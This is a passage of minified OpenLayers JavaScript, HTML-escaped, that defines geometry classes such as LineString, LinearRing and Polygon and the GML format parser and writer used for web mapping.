h=f.getArea();f=f.getCentroid(!0);isNaN(h)||(isNaN(f.x)||isNaN(f.y))||(b.push(h),d+=h,e=h&lt;e&amp;&amp;0&lt;h?h:e,c.push(f))}a=b.length;if(0===d){for(g=0;g&lt;a;++g)b[g]=1;d=b.length}else{for(g=0;g&lt;a;++g)b[g]/=e;d/=e}for(var k=e=0,g=0;g&lt;a;++g)f=c[g],h=b[g],e+=f.x*h,k+=f.y*h;return new OpenLayers.Geometry.Point(e/d,k/d)},getGeodesicLength:function(a){for(var b=0, c=0,d=this.components.length;c&lt;d;c++)b+=this.components[c].getGeodesicLength(a);return b},move:function(a,b){for(var c=0,d=this.components.length;c&lt;d;c++)this.components[c].move(a,b)},rotate:function(a,b){for(var c=0,d=this.components.length;c&lt;d;++c)this.components[c].rotate(a,b)},resize:function(a,b,c){for(var d=0;d&lt;this.components.length;++d)this.components[d].resize(a,b,c);return this},distanceTo:function(a,b){for(var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e,f,g=Number.POSITIVE_INFINITY,h=0,k=this.components.length;h&lt; k&amp;&amp;!(d=this.components[h].distanceTo(a,b),f=c?d.distance:d,f&lt;g&amp;&amp;(g=f,e=d,0==g));++h);return e},equals:function(a){var b=!0;if(a&amp;&amp;a.CLASS_NAME&amp;&amp;this.CLASS_NAME==a.CLASS_NAME)if(OpenLayers.Util.isArray(a.components)&amp;&amp;a.components.length==this.components.length)for(var c=0,d=this.components.length;c&lt;d;++c){if(!this.components[c].equals(a.components[c])){b=!1;break}}else b=!1;else b=!1;return b},transform:function(a,b){if(a&amp;&amp;b){for(var c=0,d=this.components.length;c&lt;d;c++)this.components[c].transform(a, b);this.bounds=null}return this},intersects:function(a){for(var b=!1,c=0,d=this.components.length;c&lt;d&amp;&amp;!(b=a.intersects(this.components[c]));++c);return b},getVertices:function(a){for(var b=[],c=0,d=this.components.length;c&lt;d;++c)Array.prototype.push.apply(b,this.components[c].getVertices(a));return b},CLASS_NAME:"OpenLayers.Geometry.Collection"});OpenLayers.Geometry.MultiPoint=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:["OpenLayers.Geometry.Point"],addPoint:function(a,b){this.addComponent(a,b)},removePoint:function(a){this.removeComponent(a)},CLASS_NAME:"OpenLayers.Geometry.MultiPoint"});OpenLayers.Geometry.Curve=OpenLayers.Class(OpenLayers.Geometry.MultiPoint,{componentTypes:["OpenLayers.Geometry.Point"],getLength:function(){var a=0;if(this.components&amp;&amp;1&lt;this.components.length)for(var b=1,c=this.components.length;b&lt;c;b++)a+=this.components[b-1].distanceTo(this.components[b]);return a},getGeodesicLength:function(a){var b=this;if(a){var c=new OpenLayers.Projection("EPSG:4326");c.equals(a)||(b=this.clone().transform(a,c))}a=0;if(b.components&amp;&amp;1&lt;b.components.length)for(var d,e=1,f=b.components.length;e&lt; f;e++)c=b.components[e-1],d=b.components[e],a+=OpenLayers.Util.distVincenty({lon:c.x,lat:c.y},{lon:d.x,lat:d.y});return 1E3*a},CLASS_NAME:"OpenLayers.Geometry.Curve"});OpenLayers.Geometry.LineString=OpenLayers.Class(OpenLayers.Geometry.Curve,{removeComponent:function(a){var b=this.components&amp;&amp;2&lt;this.components.length;b&amp;&amp;OpenLayers.Geometry.Collection.prototype.removeComponent.apply(this,arguments);return b},intersects:function(a){var b=!1,c=a.CLASS_NAME;if("OpenLayers.Geometry.LineString"==c||"OpenLayers.Geometry.LinearRing"==c||"OpenLayers.Geometry.Point"==c){var d=this.getSortedSegments();a="OpenLayers.Geometry.Point"==c?[{x1:a.x,y1:a.y,x2:a.x,y2:a.y}]:a.getSortedSegments(); var e,f,g,h,k,l,m,n=0,p=d.length;a:for(;n&lt;p;++n){c=d[n];e=c.x1;f=c.x2;g=c.y1;h=c.y2;var q=0,r=a.length;for(;q&lt;r;++q){k=a[q];if(k.x1>f)break;if(!(k.x2&lt;e||(l=k.y1,m=k.y2,Math.min(l,m)>Math.max(g,h)||Math.max(l,m)&lt;Math.min(g,h)||!OpenLayers.Geometry.segmentsIntersect(c,k)))){b=!0;break a}}}}else b=a.intersects(this);return b},getSortedSegments:function(){for(var a=this.components.length-1,b=Array(a),c,d,e=0;e&lt;a;++e)c=this.components[e],d=this.components[e+1],b[e]=c.x&lt;d.x?{x1:c.x,y1:c.y,x2:d.x,y2:d.y}: {x1:d.x,y1:d.y,x2:c.x,y2:c.y};return b.sort(function(a,b){return a.x1-b.x1})},splitWithSegment:function(a,b){for(var c=!(b&amp;&amp;!1===b.edge),d=b&amp;&amp;b.tolerance,e=[],f=this.getVertices(),g=[],h=[],k=!1,l,m,n,p={point:!0,tolerance:d},q=null,r=0,s=f.length-2;r&lt;=s;++r)if(d=f[r],g.push(d.clone()),l=f[r+1],m={x1:d.x,y1:d.y,x2:l.x,y2:l.y},m=OpenLayers.Geometry.segmentsIntersect(a,m,p),m instanceof OpenLayers.Geometry.Point&amp;&amp;((n=m.x===a.x1&amp;&amp;m.y===a.y1||m.x===a.x2&amp;&amp;m.y===a.y2||m.equals(d)||m.equals(l)?!0:!1)||c))m.equals(h[h.length- 1])||h.push(m.clone()),0===r&amp;&amp;m.equals(d)||m.equals(l)||(k=!0,m.equals(d)||g.push(m),e.push(new OpenLayers.Geometry.LineString(g)),g=[m.clone()]);k&amp;&amp;(g.push(l.clone()),e.push(new OpenLayers.Geometry.LineString(g)));if(0&lt;h.length)var t=a.x1&lt;a.x2?1:-1,u=a.y1&lt;a.y2?1:-1,q={lines:e,points:h.sort(function(a,b){return t*a.x-t*b.x||u*a.y-u*b.y})};return q},split:function(a,b){var c=null,d=b&amp;&amp;b.mutual,e,f,g,h;if(a instanceof OpenLayers.Geometry.LineString){var k=this.getVertices(),l,m,n,p,q,r=[];g=[];for(var s= 0,t=k.length-2;s&lt;=t;++s){l=k[s];m=k[s+1];n={x1:l.x,y1:l.y,x2:m.x,y2:m.y};h=h||[a];d&amp;&amp;r.push(l.clone());for(var u=0;u&lt;h.length;++u)if(p=h[u].splitWithSegment(n,b))if(q=p.lines,0&lt;q.length&amp;&amp;(q.unshift(u,1),Array.prototype.splice.apply(h,q),u+=q.length-2),d)for(var v=0,w=p.points.length;v&lt;w;++v)q=p.points[v],q.equals(l)||(r.push(q),g.push(new OpenLayers.Geometry.LineString(r)),r=q.equals(m)?[]:[q.clone()])}d&amp;&amp;(0&lt;g.length&amp;&amp;0&lt;r.length)&amp;&amp;(r.push(m.clone()),g.push(new OpenLayers.Geometry.LineString(r)))}else c= a.splitWith(this,b);h&amp;&amp;1&lt;h.length?f=!0:h=[];g&amp;&amp;1&lt;g.length?e=!0:g=[];if(f||e)c=d?[g,h]:h;return c},splitWith:function(a,b){return a.split(this,b)},getVertices:function(a){return!0===a?[this.components[0],this.components[this.components.length-1]]:!1===a?this.components.slice(1,this.components.length-1):this.components.slice()},distanceTo:function(a,b){var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e={},f=Number.POSITIVE_INFINITY;if(a instanceof OpenLayers.Geometry.Point){for(var g=this.getSortedSegments(), h=a.x,k=a.y,l,m=0,n=g.length;m&lt;n;++m)if(l=g[m],d=OpenLayers.Geometry.distanceToSegment(a,l),d.distance&lt;f){if(f=d.distance,e=d,0===f)break}else if(l.x2>h&amp;&amp;(k>l.y1&amp;&amp;k&lt;l.y2||k&lt;l.y1&amp;&amp;k>l.y2))break;e=c?{distance:e.distance,x0:e.x,y0:e.y,x1:h,y1:k}:e.distance}else if(a instanceof OpenLayers.Geometry.LineString){var g=this.getSortedSegments(),h=a.getSortedSegments(),p,q,r=h.length,s={point:!0},m=0,n=g.length;a:for(;m&lt;n;++m){k=g[m];l=k.x1;q=k.y1;for(var t=0;t&lt;r;++t)if(d=h[t],p=OpenLayers.Geometry.segmentsIntersect(k, d,s)){f=0;e={distance:0,x0:p.x,y0:p.y,x1:p.x,y1:p.y};break a}else d=OpenLayers.Geometry.distanceToSegment({x:l,y:q},d),d.distance&lt;f&amp;&amp;(f=d.distance,e={distance:f,x0:l,y0:q,x1:d.x,y1:d.y})}c||(e=e.distance);0!==f&amp;&amp;k&amp;&amp;(d=a.distanceTo(new OpenLayers.Geometry.Point(k.x2,k.y2),b),m=c?d.distance:d,m&lt;f&amp;&amp;(e=c?{distance:f,x0:d.x1,y0:d.y1,x1:d.x0,y1:d.y0}:m))}else e=a.distanceTo(this,b),c&amp;&amp;(e={distance:e.distance,x0:e.x1,y0:e.y1,x1:e.x0,y1:e.y0});return e},simplify:function(a){if(this&amp;&amp;null!==this){var b=this.getVertices(); if(3>b.length)return this;var c=function(a,b,d,k){for(var l=0,m=0,n=b,p;n&lt;d;n++){p=a[b];var q=a[d],r=a[n],r=Math.abs(0.5*(p.x*q.y+q.x*r.y+r.x*p.y-q.x*p.y-r.x*q.y-p.x*r.y));p=Math.sqrt(Math.pow(p.x-q.x,2)+Math.pow(p.y-q.y,2));p=2*(r/p);p>l&amp;&amp;(l=p,m=n)}l>k&amp;&amp;m!=b&amp;&amp;(e.push(m),c(a,b,m,k),c(a,m,d,k))},d=b.length-1,e=[];e.push(0);for(e.push(d);b[0].equals(b[d]);)d--,e.push(d);c(b,0,d,a);a=[];e.sort(function(a,b){return a-b});for(d=0;d&lt;e.length;d++)a.push(b[e[d]]);return new OpenLayers.Geometry.LineString(a)}return this}, CLASS_NAME:"OpenLayers.Geometry.LineString"});OpenLayers.Geometry.MultiLineString=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:["OpenLayers.Geometry.LineString"],split:function(a,b){for(var c=null,d=b&amp;&amp;b.mutual,e,f,g,h,k=[],l=[a],m=0,n=this.components.length;m&lt;n;++m){f=this.components[m];g=!1;for(var p=0;p&lt;l.length;++p)if(e=f.split(l[p],b)){if(d){g=e[0];for(var q=0,r=g.length;q&lt;r;++q)0===q&amp;&amp;k.length?k[k.length-1].addComponent(g[q]):k.push(new OpenLayers.Geometry.MultiLineString([g[q]]));g=!0;e=e[1]}if(e.length){e.unshift(p, 1);Array.prototype.splice.apply(l,e);break}}g||(k.length?k[k.length-1].addComponent(f.clone()):k=[new OpenLayers.Geometry.MultiLineString(f.clone())])}k&amp;&amp;1&lt;k.length?g=!0:k=[];l&amp;&amp;1&lt;l.length?h=!0:l=[];if(g||h)c=d?[k,l]:l;return c},splitWith:function(a,b){var c=null,d=b&amp;&amp;b.mutual,e,f,g,h,k,l;if(a instanceof OpenLayers.Geometry.LineString){l=[];k=[a];for(var m=0,n=this.components.length;m&lt;n;++m){g=!1;f=this.components[m];for(var p=0;p&lt;k.length;++p)if(e=k[p].split(f,b)){d&amp;&amp;(g=e[0],g.length&amp;&amp;(g.unshift(p, 1),Array.prototype.splice.apply(k,g),p+=g.length-2),e=e[1],0===e.length&amp;&amp;(e=[f.clone()]));g=0;for(var q=e.length;g&lt;q;++g)0===g&amp;&amp;l.length?l[l.length-1].addComponent(e[g]):l.push(new OpenLayers.Geometry.MultiLineString([e[g]]));g=!0}g||(l.length?l[l.length-1].addComponent(f.clone()):l=[new OpenLayers.Geometry.MultiLineString([f.clone()])])}}else c=a.split(this);k&amp;&amp;1&lt;k.length?h=!0:k=[];l&amp;&amp;1&lt;l.length?g=!0:l=[];if(h||g)c=d?[k,l]:l;return c},CLASS_NAME:"OpenLayers.Geometry.MultiLineString"});OpenLayers.Geometry.LinearRing=OpenLayers.Class(OpenLayers.Geometry.LineString,{componentTypes:["OpenLayers.Geometry.Point"],addComponent:function(a,b){var c=!1,d=this.components.pop();null==b&amp;&amp;a.equals(d)||(c=OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,arguments));OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,[this.components[0]]);return c},removeComponent:function(a){var b=this.components&amp;&amp;3&lt;this.components.length;b&amp;&amp;(this.components.pop(),OpenLayers.Geometry.Collection.prototype.removeComponent.apply(this, arguments),OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,[this.components[0]]));return b},move:function(a,b){for(var c=0,d=this.components.length;c&lt;d-1;c++)this.components[c].move(a,b)},rotate:function(a,b){for(var c=0,d=this.components.length;c&lt;d-1;++c)this.components[c].rotate(a,b)},resize:function(a,b,c){for(var d=0,e=this.components.length;d&lt;e-1;++d)this.components[d].resize(a,b,c);return this},transform:function(a,b){if(a&amp;&amp;b){for(var c=0,d=this.components.length;c&lt;d-1;c++)this.components[c].transform(a, b);this.bounds=null}return this},getCentroid:function(){if(this.components){var a=this.components.length;if(0&lt;a&amp;&amp;2>=a)return this.components[0].clone();if(2&lt;a){var b=0,c=0,d=this.components[0].x,e=this.components[0].y,f=-1*this.getArea();if(0!=f){for(var g=0;g&lt;a-1;g++)var h=this.components[g],k=this.components[g+1],b=b+(h.x+k.x-2*d)*((h.x-d)*(k.y-e)-(k.x-d)*(h.y-e)),c=c+(h.y+k.y-2*e)*((h.x-d)*(k.y-e)-(k.x-d)*(h.y-e));b=d+b/(6*f);a=e+c/(6*f)}else{for(g=0;g&lt;a-1;g++)b+=this.components[g].x,c+=this.components[g].y; b/=a-1;a=c/(a-1)}return new OpenLayers.Geometry.Point(b,a)}return null}},getArea:function(){var a=0;if(this.components&amp;&amp;2&lt;this.components.length){for(var b=a=0,c=this.components.length;b&lt;c-1;b++)var d=this.components[b],e=this.components[b+1],a=a+(d.x+e.x)*(e.y-d.y);a=-a/2}return a},getGeodesicArea:function(a){var b=this;if(a){var c=new OpenLayers.Projection("EPSG:4326");c.equals(a)||(b=this.clone().transform(a,c))}a=0;c=b.components&amp;&amp;b.components.length;if(2&lt;c){for(var d,e,f=0;f&lt;c-1;f++)d=b.components[f], e=b.components[f+1],a+=OpenLayers.Util.rad(e.x-d.x)*(2+Math.sin(OpenLayers.Util.rad(d.y))+Math.sin(OpenLayers.Util.rad(e.y)));a=40680631590769*a/2}return a},containsPoint:function(a){var b=OpenLayers.Number.limitSigDigs,c=b(a.x,14);a=b(a.y,14);for(var d=this.components.length-1,e,f,g,h,k,l=0,m=0;m&lt;d;++m)if(e=this.components[m],g=b(e.x,14),e=b(e.y,14),f=this.components[m+1],h=b(f.x,14),f=b(f.y,14),e==f){if(a==e&amp;&amp;(g&lt;=h&amp;&amp;c>=g&amp;&amp;c&lt;=h||g>=h&amp;&amp;c&lt;=g&amp;&amp;c>=h)){l=-1;break}}else{k=b((a-f)*((h-g)/(f-e))+h,14);if(k== c&amp;&amp;(e&lt;f&amp;&amp;a>=e&amp;&amp;a&lt;=f||e>f&amp;&amp;a&lt;=e&amp;&amp;a>=f)){l=-1;break}k&lt;=c||g!=h&amp;&amp;(k&lt;Math.min(g,h)||k>Math.max(g,h))||(e&lt;f&amp;&amp;a>=e&amp;&amp;a&lt;f||e>f&amp;&amp;a&lt;e&amp;&amp;a>=f)&amp;&amp;++l}return-1==l?1:!!(l&amp;1)},intersects:function(a){var b=!1;if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.containsPoint(a);else if("OpenLayers.Geometry.LineString"==a.CLASS_NAME)b=a.intersects(this);else if("OpenLayers.Geometry.LinearRing"==a.CLASS_NAME)b=OpenLayers.Geometry.LineString.prototype.intersects.apply(this,[a]);else for(var c=0,d=a.components.length;c&lt; d&amp;&amp;!(b=a.components[c].intersects(this));++c);return b},getVertices:function(a){return!0===a?[]:this.components.slice(0,this.components.length-1)},CLASS_NAME:"OpenLayers.Geometry.LinearRing"});OpenLayers.Geometry.Polygon=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:["OpenLayers.Geometry.LinearRing"],getArea:function(){var a=0;if(this.components&amp;&amp;0&lt;this.components.length)for(var a=a+Math.abs(this.components[0].getArea()),b=1,c=this.components.length;b&lt;c;b++)a-=Math.abs(this.components[b].getArea());return a},getGeodesicArea:function(a){var b=0;if(this.components&amp;&amp;0&lt;this.components.length)for(var b=b+Math.abs(this.components[0].getGeodesicArea(a)),c=1,d=this.components.length;c&lt; d;c++)b-=Math.abs(this.components[c].getGeodesicArea(a));return b},containsPoint:function(a){var b=this.components.length,c=!1;if(0&lt;b&amp;&amp;(c=this.components[0].containsPoint(a),1!==c&amp;&amp;c&amp;&amp;1&lt;b))for(var d,e=1;e&lt;b;++e)if(d=this.components[e].containsPoint(a)){c=1===d?1:!1;break}return c},intersects:function(a){var b=!1,c,d;if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.containsPoint(a);else if("OpenLayers.Geometry.LineString"==a.CLASS_NAME||"OpenLayers.Geometry.LinearRing"==a.CLASS_NAME){c=0;for(d= this.components.length;c&lt;d&amp;&amp;!(b=a.intersects(this.components[c]));++c);if(!b)for(c=0,d=a.components.length;c&lt;d&amp;&amp;!(b=this.containsPoint(a.components[c]));++c);}else for(c=0,d=a.components.length;c&lt;d&amp;&amp;!(b=this.intersects(a.components[c]));++c);if(!b&amp;&amp;"OpenLayers.Geometry.Polygon"==a.CLASS_NAME){var e=this.components[0];c=0;for(d=e.components.length;c&lt;d&amp;&amp;!(b=a.containsPoint(e.components[c]));++c);}return b},distanceTo:function(a,b){return b&amp;&amp;!1===b.edge&amp;&amp;this.intersects(a)?0:OpenLayers.Geometry.Collection.prototype.distanceTo.apply(this, [a,b])},CLASS_NAME:"OpenLayers.Geometry.Polygon"});OpenLayers.Geometry.Polygon.createRegularPolygon=function(a,b,c,d){var e=Math.PI*(1/c-0.5);d&amp;&amp;(e+=d/180*Math.PI);for(var f,g=[],h=0;h&lt;c;++h)f=e+2*h*Math.PI/c,d=a.x+b*Math.cos(f),f=a.y+b*Math.sin(f),g.push(new OpenLayers.Geometry.Point(d,f));a=new OpenLayers.Geometry.LinearRing(g);return new OpenLayers.Geometry.Polygon([a])};OpenLayers.Geometry.MultiPolygon=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:["OpenLayers.Geometry.Polygon"],CLASS_NAME:"OpenLayers.Geometry.MultiPolygon"});OpenLayers.Format.GML=OpenLayers.Class(OpenLayers.Format.XML,{featureNS:"http://mapserver.gis.umn.edu/mapserver",featurePrefix:"feature",featureName:"featureMember",layerName:"features",geometryName:"geometry",collectionName:"FeatureCollection",gmlns:"http://www.opengis.net/gml",extractAttributes:!0,xy:!0,initialize:function(a){this.regExes={trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g};OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){"string"== typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a=this.getElementsByTagNameNS(a.documentElement,this.gmlns,this.featureName);for(var b=[],c=0;c&lt;a.length;c++){var d=this.parseFeature(a[c]);d&amp;&amp;b.push(d)}return b},parseFeature:function(a){for(var b="MultiPolygon Polygon MultiLineString LineString MultiPoint Point Envelope".split(" "),c,d,e,f=0;f&lt;b.length;++f)if(c=b[f],d=this.getElementsByTagNameNS(a,this.gmlns,c),0&lt;d.length){if(e=this.parseGeometry[c.toLowerCase()])e=e.apply(this, [d[0]]),this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.transform(this.externalProjection,this.internalProjection);else throw new TypeError("Unsupported geometry type: "+c);break}var g;c=this.getElementsByTagNameNS(a,this.gmlns,"Box");for(f=0;f&lt;c.length;++f)b=c[f],d=this.parseGeometry.box.apply(this,[b]),b=b.parentNode,"boundedBy"===(b.localName||b.nodeName.split(":").pop())?g=d:e=d.toGeometry();var h;this.extractAttributes&amp;&amp;(h=this.parseAttributes(a));h=new OpenLayers.Feature.Vector(e,h);h.bounds= g;h.gml={featureType:a.firstChild.nodeName.split(":")[1],featureNS:a.firstChild.namespaceURI,featureNSPrefix:a.firstChild.prefix};a=a.firstChild;for(var k;a&amp;&amp;(1!=a.nodeType||!(k=a.getAttribute("fid")||a.getAttribute("id")));)a=a.nextSibling;h.fid=k;return h},parseGeometry:{point:function(a){var b,c;c=[];b=this.getElementsByTagNameNS(a,this.gmlns,"pos");0&lt;b.length&amp;&amp;(c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));0==c.length&amp;&amp;(b=this.getElementsByTagNameNS(a, this.gmlns,"coordinates"),0&lt;b.length&amp;&amp;(c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.removeSpace,""),c=c.split(",")));0==c.length&amp;&amp;(b=this.getElementsByTagNameNS(a,this.gmlns,"coord"),0&lt;b.length&amp;&amp;(a=this.getElementsByTagNameNS(b[0],this.gmlns,"X"),b=this.getElementsByTagNameNS(b[0],this.gmlns,"Y"),0&lt;a.length&amp;&amp;0&lt;b.length&amp;&amp;(c=[a[0].firstChild.nodeValue,b[0].firstChild.nodeValue])));2==c.length&amp;&amp;(c[2]=null);return this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1], c[0],c[2])},multipoint:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,"Point");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.point.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiPoint(b)},linestring:function(a,b){var c,d;d=[];var e=[];c=this.getElementsByTagNameNS(a,this.gmlns,"posList");if(0&lt;c.length){d=this.getChildValue(c[0]);d=d.replace(this.regExes.trimSpace,"");d=d.split(this.regExes.splitSpace);var f=parseInt(c[0].getAttribute("dimension")), g,h,k;for(c=0;c&lt;d.length/f;++c)g=c*f,h=d[g],k=d[g+1],g=2==f?null:d[g+2],this.xy?e.push(new OpenLayers.Geometry.Point(h,k,g)):e.push(new OpenLayers.Geometry.Point(k,h,g))}if(0==d.length&amp;&amp;(c=this.getElementsByTagNameNS(a,this.gmlns,"coordinates"),0&lt;c.length))for(d=this.getChildValue(c[0]),d=d.replace(this.regExes.trimSpace,""),d=d.replace(this.regExes.trimComma,","),f=d.split(this.regExes.splitSpace),c=0;c&lt;f.length;++c)d=f[c].split(","),2==d.length&amp;&amp;(d[2]=null),this.xy?e.push(new OpenLayers.Geometry.Point(d[0], d[1],d[2])):e.push(new OpenLayers.Geometry.Point(d[1],d[0],d[2]));d=null;0!=e.length&amp;&amp;(d=b?new OpenLayers.Geometry.LinearRing(e):new OpenLayers.Geometry.LineString(e));return d},multilinestring:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,"LineString");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.linestring.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiLineString(b)},polygon:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,"LinearRing"); var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.linestring.apply(this,[a[d],!0]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.Polygon(b)},multipolygon:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,"Polygon");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.polygon.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiPolygon(b)},envelope:function(a){var b=[],c,d,e=this.getElementsByTagNameNS(a,this.gmlns,"lowerCorner");if(0&lt;e.length){c= [];0&lt;e.length&amp;&amp;(c=e[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));2==c.length&amp;&amp;(c[2]=null);var f=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])}a=this.getElementsByTagNameNS(a,this.gmlns,"upperCorner");if(0&lt;a.length){c=[];0&lt;a.length&amp;&amp;(c=a[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));2==c.length&amp;&amp;(c[2]=null);var g=this.xy?new OpenLayers.Geometry.Point(c[0], c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])}f&amp;&amp;g&amp;&amp;(b.push(new OpenLayers.Geometry.Point(f.x,f.y)),b.push(new OpenLayers.Geometry.Point(g.x,f.y)),b.push(new OpenLayers.Geometry.Point(g.x,g.y)),b.push(new OpenLayers.Geometry.Point(f.x,g.y)),b.push(new OpenLayers.Geometry.Point(f.x,f.y)),b=new OpenLayers.Geometry.LinearRing(b),d=new OpenLayers.Geometry.Polygon([b]));return d},box:function(a){var b=this.getElementsByTagNameNS(a,this.gmlns,"coordinates"),c=a=null;0&lt;b.length&amp;&amp;(b=b[0].firstChild.nodeValue, b=b.split(" "),2==b.length&amp;&amp;(a=b[0].split(","),c=b[1].split(",")));if(null!==a&amp;&amp;null!==c)return new OpenLayers.Bounds(parseFloat(a[0]),parseFloat(a[1]),parseFloat(c[0]),parseFloat(c[1]))}},parseAttributes:function(a){var b={};a=a.firstChild;for(var c,d,e;a;){if(1==a.nodeType){a=a.childNodes;for(c=0;c&lt;a.length;++c)if(d=a[c],1==d.nodeType)if(e=d.childNodes,1==e.length){if(e=e[0],3==e.nodeType||4==e.nodeType)d=d.prefix?d.nodeName.split(":")[1]:d.nodeName,e=e.nodeValue.replace(this.regExes.trimSpace, ""),b[d]=e}else b[d.nodeName.split(":").pop()]=null;break}a=a.nextSibling}return b},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=this.createElementNS("http://www.opengis.net/wfs","wfs:"+this.collectionName),c=0;c&lt;a.length;c++)b.appendChild(this.createFeatureXML(a[c]));return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.featureNS,this.featurePrefix+":"+this.geometryName);c.appendChild(b); var b=this.createElementNS(this.gmlns,"gml:"+this.featureName),d=this.createElementNS(this.featureNS,this.featurePrefix+":"+this.layerName);d.setAttribute("fid",a.fid||a.id);d.appendChild(c);for(var e in a.attributes){var c=this.createTextNode(a.attributes[e]),f=e.substring(e.lastIndexOf(":")+1),f=this.createElementNS(this.featureNS,this.featurePrefix+":"+f);f.appendChild(c);d.appendChild(f)}b.appendChild(d);return b},buildGeometryNode:function(a){this.externalProjection&amp;&amp;this.internalProjection&amp;&amp; (a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b=a.CLASS_NAME,b=b.substring(b.lastIndexOf(".")+1);return this.buildGeometry[b.toLowerCase()].apply(this,[a])},buildGeometry:{point:function(a){var b=this.createElementNS(this.gmlns,"gml:Point");b.appendChild(this.buildCoordinatesNode(a));return b},multipoint:function(a){var b=this.createElementNS(this.gmlns,"gml:MultiPoint");a=a.components;for(var c,d,e=0;e&lt;a.length;e++)c=this.createElementNS(this.gmlns,"gml:pointMember"), d=this.buildGeometry.point.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},linestring:function(a){var b=this.createElementNS(this.gmlns,"gml:LineString");b.appendChild(this.buildCoordinatesNode(a));return b},multilinestring:function(a){var b=this.createElementNS(this.gmlns,"gml:MultiLineString");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=this.createElementNS(this.gmlns,"gml:lineStringMember"),d=this.buildGeometry.linestring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c); return b},linearring:function(a){var b=this.createElementNS(this.gmlns,"gml:LinearRing");b.appendChild(this.buildCoordinatesNode(a));return b},polygon:function(a){var b=this.createElementNS(this.gmlns,"gml:Polygon");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=0==e?"outerBoundaryIs":"innerBoundaryIs",c=this.createElementNS(this.gmlns,"gml:"+c),d=this.buildGeometry.linearring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},multipolygon:function(a){var b=this.createElementNS(this.gmlns, "gml:MultiPolygon");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=this.createElementNS(this.gmlns,"gml:polygonMember"),d=this.buildGeometry.polygon.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},bounds:function(a){var b=this.createElementNS(this.gmlns,"gml:Box");b.appendChild(this.buildCoordinatesNode(a));return b}},buildCoordinatesNode:function(a){var b=this.createElementNS(this.gmlns,"gml:coordinates");b.setAttribute("decimal",".");b.setAttribute("cs",",");b.setAttribute("ts", " ");var c=[];if(a instanceof OpenLayers.Bounds)c.push(a.left+","+a.bottom),c.push(a.right+","+a.top);else{a=a.components?a.components:[a];for(var d=0;d&lt;a.length;d++)c.push(a[d].x+","+a[d].y)}c=this.createTextNode(c.join(" "));b.appendChild(c);return b},CLASS_NAME:"OpenLayers.Format.GML"});OpenLayers.Format.GML||(OpenLayers.Format.GML={}); OpenLayers.Format.GML.Base=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",wfs:"http://www.opengis.net/wfs"},defaultPrefix:"gml",schemaLocation:null,featureType:null,featureNS:null,geometryName:"geometry",extractAttributes:!0,srsName:null,xy:!0,geometryTypes:null,singleFeatureType:null,regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g,featureMember:/^(.*:)?featureMembers?$/}, initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.setGeometryTypes();a&amp;&amp;a.featureNS&amp;&amp;this.setNamespace("feature",a.featureNS);this.singleFeatureType=!a||"string"===typeof a.featureType},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=[];this.readNode(a,{features:b},!0);if(0==b.length){var c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMember");if(c.length){a= 0;for(var 